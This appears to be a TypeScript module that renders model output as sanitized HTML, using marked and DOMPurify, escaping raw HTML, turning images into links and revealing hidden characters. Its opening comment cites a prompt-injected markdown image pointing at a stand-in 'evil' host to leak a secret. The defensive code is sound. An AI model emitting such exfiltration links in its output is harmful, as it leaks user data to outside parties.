// Model output -> sanitized HTML.
//
// - marked (GFM) on its own instance; raw HTML in the source is escaped, so it
//   is shown as text and never interpreted.
// - Images are rendered as links: a prompt-injected ![x](https://evil/?q=secret)
//   would otherwise leak data the moment it renders.
// - A dedicated DOMPurify instance (its hooks never leak into other uses)
//   sanitizes the result: HTML profile only (no SVG/MathML), no inline styles,
//   links restricted to http(s)/mailto and opened in a new tab without referrer.
// - Hidden characters (Trojan Source, CVE-2021-42574) are made visible after
//   sanitizing, so the screen shows the same text a copy puts on the clipboard
//   (see hidden-chars.ts: every one inside code; in prose all but the directional
//   marks, a lone joiner or soft hyphen next to a letter, and a lone selector right
//   after the character it styles).

import createDOMPurify, { type Config, type DOMPurify } from 'dompurify';
import { Marked } from 'marked';
import { revealHiddenIn } from './hidden-chars';
import { i18n } from './i18n/index.svelte';

const ESCAPES: Record<string, string> = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' };
export const escapeHtml = (s: string): string => s.replace(/[&<>"']/g, (c) => ESCAPES[c] ?? c);

const SAFE_HREF = /^(?:https?:\/\/|mailto:)/i;

const md = new Marked({ gfm: true, breaks: false, async: false });
md.use({
  renderer: {
    html({ text }) {
      return escapeHtml(text);
    },
    image({ href, text }) {
      const texts = i18n.m.turn.markdown;
      const label = text ? texts.imageNamed(text) : texts.image;
      return `<a href="${escapeHtml(href)}" class="md-image-link">${escapeHtml(label)}</a>`;
    },
  },
});

const PURIFY_CONFIG: Config = {
  USE_PROFILES: { html: true },
  FORBID_TAGS: [
    'img', 'picture', 'video', 'audio', 'source', 'track', 'style', 'link', 'meta', 'base', 'form', 'input',
    'button', 'textarea', 'select', 'option', 'iframe', 'frame', 'frameset', 'object', 'embed', 'template',
    'dialog', 'svg', 'math', 'canvas', 'noscript',
  ],
  FORBID_ATTR: ['style', 'srcset', 'id', 'name', 'target', 'formaction', 'action', 'background', 'poster'],
  ALLOW_DATA_ATTR: false,
  ALLOW_ARIA_ATTR: false,
};

let purifier: DOMPurify | null = null;

function getPurifier(): DOMPurify {
  if (purifier) return purifier;
  const p = createDOMPurify(window);
  p.addHook('afterSanitizeAttributes', (node) => {
    if (node.nodeName !== 'A') return;
    const el = node as Element;
    const href = el.getAttribute('href')?.trim() ?? '';
    if (!SAFE_HREF.test(href)) {
      el.removeAttribute('href');
      return;
    }
    el.setAttribute('target', '_blank');
    el.setAttribute('rel', 'noopener noreferrer nofollow');
    el.setAttribute('referrerpolicy', 'no-referrer');
  });
  purifier = p;
  return p;
}

/** Render untrusted markdown to safe HTML (its few texts in the language in force). */
export function renderMarkdown(src: string): string {
  if (!src) return '';
  const html = md.parse(src, { async: false });
  const clean = getPurifier().sanitize(html, { ...PURIFY_CONFIG, RETURN_DOM_FRAGMENT: true });
  revealHiddenIn(clean);
  // Serialized like DOMPurify's own string output (the children's innerHTML).
  const holder = clean.ownerDocument.createElement('div');
  holder.append(clean);
  return holder.innerHTML;
}

/**
 * Critiques are meant to be bullets; models sometimes answer with plain lines.
 * Turn plain lines into a list so they read the same.
 */
export function critiqueMarkdown(src: string): string {
  const text = src.trim();
  if (!text) return '';
  if (/^\s*(?:[-*+]|\d+[.)])\s/m.test(text)) return text;
  const lines = text.split(/\n+/).map((l) => l.trim()).filter(Boolean);
  return lines.length > 1 ? lines.map((l) => `- ${l}`).join('\n') : text;
}

/** True when the rendered HTML has code blocks worth highlighting. */
export const hasCodeBlocks = (html: string): boolean => html.includes('<pre>');
